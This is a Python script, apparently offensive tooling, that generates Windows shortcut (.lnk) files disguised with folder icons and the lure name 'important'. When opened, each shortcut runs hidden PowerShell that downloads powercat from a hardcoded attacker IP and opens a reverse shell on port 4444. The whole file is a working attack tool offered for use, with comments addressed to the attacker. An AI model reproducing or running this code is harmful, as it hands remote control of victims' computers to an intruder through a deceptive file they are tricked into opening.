import os
import argparse
import win32com.client
import base64

# Hardcoded default values
DEFAULT_NAME = "important"

# Modify the IPs and Port
# Powercat need to be shared by the attacker (python3 -m http.server 8000)
# PowerShell payload (to be encoded in Base64)
PAYLOAD = r"""
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.72:8000/powercat.ps1'); powercat -c 192.168.1.72 -p 4444 -e powershell
"""

# Default icon paths
DEFAULT_ICONS = {
    "Documents": "C:\\Windows\\System32\\imageres.dll,-102",
    "Music": "C:\\Windows\\System32\\imageres.dll,-108",
    "Pictures": "C:\\Windows\\System32\\imageres.dll,-113",
    "Videos": "C:\\Windows\\System32\\imageres.dll,-116",
}

def encode_payload(payload):
    # Encode payload in Base64
    encoded_payload = base64.b64encode(payload.encode()).decode()
    return encoded_payload

def create_shortcut(name, encoded_payload, icon):
    try:
        # Create PowerShell command to execute decoded payload
        powershell_command = rf"""
        powershell.exe -WindowStyle Hidden -c "{PAYLOAD.strip()}"
        """

        # Create WScript.Shell object
        shell = win32com.client.Dispatch("WScript.Shell")
        
        # Get full path to save the shortcut
        shortcut_path = os.path.join(os.getcwd(), f"{name}.lnk")
        
        # Create shortcut object
        shortcut = shell.CreateShortcut(shortcut_path)

        # Set properties
        shortcut.TargetPath = "powershell.exe"
        shortcut.Arguments = rf'-WindowStyle Hidden -c "{PAYLOAD.strip()}"'
        shortcut.WorkingDirectory = os.environ['SystemRoot']
        
        # Set icon
        if icon in DEFAULT_ICONS:
            shortcut.IconLocation = DEFAULT_ICONS[icon]
        else:
            print(f"Icon '{icon}' not found. Using default icon for 'Documents'.")
            shortcut.IconLocation = DEFAULT_ICONS["Documents"]
        
        # Save shortcut
        shortcut.Save()

        print(f"Shortcut created: {name}.lnk")
    except Exception as e:
        print(f"Error creating shortcut: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Create Windows shortcut (.lnk) files",
        usage="python lnk-creator.py [--name <name>] [--icon <icon>]"
    )
    parser.add_argument('--name', default=DEFAULT_NAME, help="Name of the shortcut file (default: 'important')")
    parser.add_argument('--icon', choices=list(DEFAULT_ICONS.keys()), help="Choose an icon for the shortcut. Available options: Documents, Music, Pictures, Videos")

    args = parser.parse_args()

    # If icon path is not provided or invalid, fallback to the default icon for "Documents"
    chosen_icon = args.icon if args.icon else "Documents"

    # Encode the payload in Base64 (for future use if needed)
    encoded_payload = encode_payload(PAYLOAD.strip())

    # Create shortcut with decoded payload
    create_shortcut(args.name, encoded_payload, chosen_icon)

if __name__ == "__main__":
    main()
